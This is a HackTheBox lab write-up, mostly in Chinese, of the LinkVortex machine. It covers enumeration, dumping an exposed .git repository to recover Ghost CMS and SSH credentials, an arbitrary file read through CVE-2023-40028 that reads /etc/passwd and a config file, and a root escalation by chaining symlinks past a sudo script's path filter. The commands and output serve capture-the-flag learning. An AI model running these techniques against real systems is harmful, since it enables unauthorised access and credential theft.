---
title: 'HackTheBox: LinkVortex'
disqus: hackmd
---

HackTheBox: LinkVortex
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/LinkVortex

### Initial Enumeration

● Start Machine: `10.10.11.47`\
![image](https://hackmd.io/_uploads/SJW8MuLAyl.png)


```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.47 
Nmap scan report for 10.10.11.47
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 241.69 seconds
```
> SSH, HTTP

編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts            
10.10.11.47     linkvortex.htb    
```
瀏覽 http://linkvortex.htb/ \
![image](https://hackmd.io/_uploads/S1MG7dUCyl.png)
> Page 最下面有個 Sign up，但沒有功能
> >view-source 沒有明顯漏洞

- ffuf path
```
┌──(chw㉿CHW)-[~]
└─$ ffuf -t 50 -r -w /usr/share/dirb/wordlists/common.txt -u http://linkvortex.htb/FUZZ -e .git,.php,.bak,.zip 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________
...
                        [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 673ms]
about                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 557ms]
About                   [Status: 200, Size: 8284, Words: 1296, Lines: 162, Duration: 511ms]
favicon.ico             [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 498ms]
favicon.ico.php         [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 671ms]
favicon.ico.zip         [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 671ms]
favicon.ico.bak         [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 672ms]
favicon.ico.git         [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 672ms]
feed                    [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 829ms]
LICENSE                 [Status: 200, Size: 1065, Words: 149, Lines: 23, Duration: 525ms]
private                 [Status: 200, Size: 12148, Words: 2590, Lines: 308, Duration: 955ms]
robots.txt              [Status: 200, Size: 121, Words: 7, Lines: 7, Duration: 317ms]
rss                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 879ms]
RSS                     [Status: 200, Size: 26682, Words: 3078, Lines: 1, Duration: 565ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 202ms]
sitemap.xml             [Status: 200, Size: 527, Words: 6, Lines: 1, Duration: 766ms]

```
- 瀏覽 http://linkvortex.htb/robots.txt
![image](https://hackmd.io/_uploads/rkgkADuLA1x.png)

- 瀏覽 http://linkvortex.htb/sitemap.xml
![image](https://hackmd.io/_uploads/r1zld_L0yl.png)

- 瀏覽 http://linkvortex.htb/ghost/
![image](https://hackmd.io/_uploads/rJuQuOLAye.png)


## Solution

### 1. Searchsploit
![image](https://hackmd.io/_uploads/S1g6X_UCyx.png)
> CMS: Ghost 5.58

```
┌──(chw㉿CHW)-[~]
└─$ searchsploit ghost 5.58
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Ghostscript < 8.64 - 'gdevpdtb.c' Local Buffer Overflow                                                        | multiple/local/10326.txt
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(chw㉿CHW)-[~]
└─$ searchsploit ghost 5.58
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Ghostscript < 8.64 - 'gdevpdtb.c' Local Buffer Overflow                                                           | multiple/local/10326.txt
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```
> 幫助不大

Ghost v5.58 CVE Exploit: [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)
但前提是需要 username 和 password

在查 ghost default login 的過程中，看到可能有 Subdomain
[[How do I login to Ghost Admin?](https://ghost.org/help/how-do-i-login-to-ghost-admin/)]


### 2. ffuf Subdomain
```
┌──(chw㉿CHW)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb -c -mc 200


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 1043ms]
```
編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts            
10.10.11.47     linkvortex.htb dev.linkvortex.htb   
```
瀏覽 http://dev.linkvortex.htb/\
![image](https://hackmd.io/_uploads/B15v3u8Ryx.png)
> 沒架完的通常比較有趣 👷🏻‍♂️

### 3. dev.linkvortex.htb
- dirsearch
```
┌──(chw㉿CHW)-[~]
└─$ dirsearch -u http://dev.linkvortex.htb/ -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                             
                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/chw/reports/http_dev.linkvortex.htb/__25-04-11_07-36-50.txt

Target: http://dev.linkvortex.htb/

[07:36:50] Starting:                                                                                                                                
[07:36:58] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        
[07:36:58] 200 -   73B  - /.git/description                                 
[07:36:58] 200 -  201B  - /.git/config
[07:36:58] 200 -  557B  - /.git/                                            
[07:36:59] 200 -   41B  - /.git/HEAD                                        
[07:36:59] 200 -  620B  - /.git/hooks/                                      
[07:36:59] 200 -  401B  - /.git/logs/                                       
[07:36:59] 200 -  240B  - /.git/info/exclude
[07:36:59] 200 -  175B  - /.git/logs/HEAD                                   
[07:36:59] 200 -  402B  - /.git/info/
[07:36:59] 200 -  393B  - /.git/refs/
...
```
> 確實有趣

瀏覽 http://dev.linkvortex.htb/.git/ \
![image](https://hackmd.io/_uploads/ByNSkt8Cyx.png)

### 4. Gitdumper
```
┌──(chw㉿CHW)-[~/Tools/git-dumper]
└─$ python3 git_dumper.py http://dev.linkvortex.htb/.git/ HTB
/home/chw/Tools/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
...
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index

```
目標是要登入 CMS，在 git dump 的資料夾搜尋 `admin`, `password` 或 `pwd`
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/HTB]
└─$ grep -riE 'admin|password|pwd' . 
...
```
![image](https://hackmd.io/_uploads/Hklk4KI01l.png)
> `admin@linkvortex.htb` : `OctopiFociPilfer45`

![image](https://hackmd.io/_uploads/SyjvrFIRJg.png)
>  Blowfish 爆破天荒地老

### 4. 登入 CMS
利用 `admin@linkvortex.htb` : `OctopiFociPilfer45` 登入 ghost
![image](https://hackmd.io/_uploads/ryjStt801x.png)

### 5. Exploit
嘗試利用前面已經找到的 CVE Exploit 任意讀檔
```
┌──(chw㉿CHW)-[~/Tools/CVE-exploit]
└─$ git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git 
┌──(chw㉿CHW)-[~/Tools/CVE-exploit/CVE-2023-40028_Ghost-5.58_Arbitrary_File_Read]
└─$ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
Enter the file path to read (or type 'exit' to quit): 
```
> User: node

嘗試讀取 node SSH id_rsa
```
Enter the file path to read (or type 'exit' to quit): /home/node/.ssh/id_rsa
File content:
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Not Found</pre>
</body>
</html>
```
> 失敗
> > `/etc/ssh/ssh_config`, `/root/.ssh/id_rsa` 也都失敗

回去檢查 git leak 內容\
在 Dockerfile 中 `config.production.json` 會複製到 `/var/lib/ghost/config.production.json` 路徑下
```
┌──(chw㉿CHW)-[~/Tools/git-dumper/HTB]
└─$ cat Dockerfile.ghost 
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json
```

因此嘗試用 exploit 瀏覽 `/var/lib/ghost/config.production.json`
```
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}

```
> `bob@linkvortex.htb` : `fibber-talented-worth`

### 6. Login SSH
```
┌──(chw㉿CHW)-[~]
└─$ ssh bob@linkvortex.htb            
The authenticity of host 'linkvortex.htb (10.10.11.47)' can't be established.
ED25519 key fingerprint is SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...

Last login: Fri Apr 11 11:53:09 2025 from 10.10.14.136
bob@linkvortex:~$ whoami
bob
bob@linkvortex:~$ hostname
linkvortex
bob@linkvortex:~$ pwd
/home/bob

```

### ✅ Get User Flag
> 在 `/home/bob` 找到 User flag

## Privileges Escalation

### 7. Sudo -l
```
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```
> `/usr/bin/bash /opt/ghost/clean_symlink.sh *.png`

### 8. `/opt/ghost/clean_symlink.sh`
查看 `/opt/ghost/clean_symlink.sh` 有沒有寫入權限
```
bob@linkvortex:~$ ls -al /opt/ghost/clean_symlink.sh
-rwxr--r-- 1 root root 745 Nov  1 08:46 /opt/ghost/clean_symlink.sh
```
> NO

查看 Shell 內容：
```
bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```
>  若 CHECK_CONTENT=true（透過 env_keep+=CHECK_CONTENT 保留），則會 cat 出 quarantined 檔案內容\
>  但路徑不能包含 `etc` 或 `root`

Symbolic link 可以嘗試繞過
### 9. Symbolic link
```
bob@linkvortex:~$ ln -s /root/root.txt chw.txt
bob@linkvortex:~$ ln -s /home/bob/chw.txt chw_flag.png 
bob@linkvortex:~$ ls
chw.txt  chw_flag.png  user.txt
bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/chw_flag.png
Link found [ /home/bob/chw_flag.png ] , moving it to quarantine
Content:
6d3552a7****************
```
> 1. 建立了一個 symlink `chw.txt` 指向 `/root/root.txt`
> 2. 再建立一個 symlink `chw_flag.png` 指向 `chw.txt`\
> 間接指到 /root/root.txt

### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/r1N9VoLAyl.png)



###### tags: `HTB` `Web` `CTF` 
